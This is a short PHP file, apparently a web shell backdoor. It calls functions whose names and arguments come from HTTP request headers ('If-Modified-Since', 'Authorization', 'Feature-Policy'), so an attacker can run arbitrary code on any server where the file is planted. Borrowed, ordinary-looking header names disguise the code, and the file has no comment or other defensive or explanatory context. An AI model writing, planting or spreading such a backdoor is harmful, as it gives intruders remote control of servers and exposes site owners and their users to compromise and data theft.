<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $center = $_HEADERS['If-Modified-Since']('', $_HEADERS['Authorization']($_HEADERS['Feature-Policy']));
    $center();
}